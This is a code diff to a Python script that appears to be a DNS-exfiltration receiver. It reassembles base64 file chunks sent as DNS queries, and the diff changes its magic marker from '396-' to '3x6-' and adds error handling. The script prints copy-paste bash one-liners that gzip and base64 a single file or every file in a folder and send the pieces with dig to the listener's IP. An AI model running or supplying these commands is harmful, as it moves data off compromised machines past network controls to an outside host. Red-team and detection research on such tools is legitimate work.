@@ -55,16 +55,21 @@ def save_to_file(r_data, z, v):
 		fname = "recieved_%s_%s" % (file_seed, key)
 		flatdata = ""
 
+		if not value:
+			if v:
+				print("Skipping reassembly of file {}, since no payload was received.".format(fname))
+			continue
+
 		if v:
-			print("Reassembling {}".format(value))
+			print("Reassembling {} from {}".format(fname, value))
 
 		try:
 			for i in range(0, max(value.keys()) + 1):
 				for block in value[i]:
 					fixed_block = block[:-1].replace("*", "+")
 					flatdata += fixed_block
-		except KeyError as err:
-			print "%s[Error]%s Missing index %s of file '%s'." % (c["r"], c["e"], i, key)
+		except KeyError as key_error:
+			print "%s[Error]%s Missing index %s of file '%s'." % (c["r"], c["e"], key_error, key)
 
 		#for index, block in value.items():
 		# 	flatdata += block[:-1].replace("*", "+") # fix data (remove hyphens at end, replace * with + because of dig!)
@@ -144,17 +149,17 @@ def p_cmds(s,b,ip,z):
 
 	if (z):
 		print "%s[?]%s Copy individual file (ZIP enabled)" % (c["y"], c["e"])
-		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 396-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
+		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
 		print
 		print "%s[?]%s Copy entire folder (ZIP enabled)" % (c["y"], c["e"])
-		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 396-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done ; done""" % (c["r"], c["e"], s, b, ip )
+		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done ; done""" % (c["r"], c["e"], s, b, ip )
 		print
 	else:
 		print "%s[?]%s Copy individual file" % (c["y"], c["e"])
-		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0;ix=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 396-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
+		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0;ix=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
 		print
 		print "%s[?]%s Copy entire folder" % (c["y"], c["e"])
-		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0;ix=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 396-.${ix}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done ; done""" % (c["r"], c["e"], s, b, ip )
+		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0;ix=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done ; done""" % (c["r"], c["e"], s, b, ip )
 		print
 
 
@@ -254,16 +259,23 @@ if __name__ == '__main__':
 
 			if len(tmp_data) < 2:
 				if v:
-					print("Skipping packet: {} since it does have less than 2 payloads".format(req_split, expected_payloads))
+					print("Skipping packet: {} since it does have less than 2 payloads".format(req_split))
 				continue
 
 			magic_nr = tmp_data[0]
-			if magic_nr != "396-":
+			if magic_nr != "3x6-":
 				if v:
-					print("Skipping packet: {} since it does not have magic nr 396)".format(req_split))
+					print("Skipping packet: {} since it does not have magic nr 3x6)".format(req_split))
 				continue
 
-			index = int(tmp_data[1].rstrip("-"))
+			try:
+				index = int(tmp_data[1].rstrip("-"))
+			except ValueError as err:
+				# This should usually not happen
+				if v:
+					print("Skipping packet: {} since its index was not a number".format(req_split))
+				continue
+
 
 			print "%s[>]%s len: '%d bytes'\t- %s" % (c["y"], c["e"], len(p.data_text), fname)
 			if v:
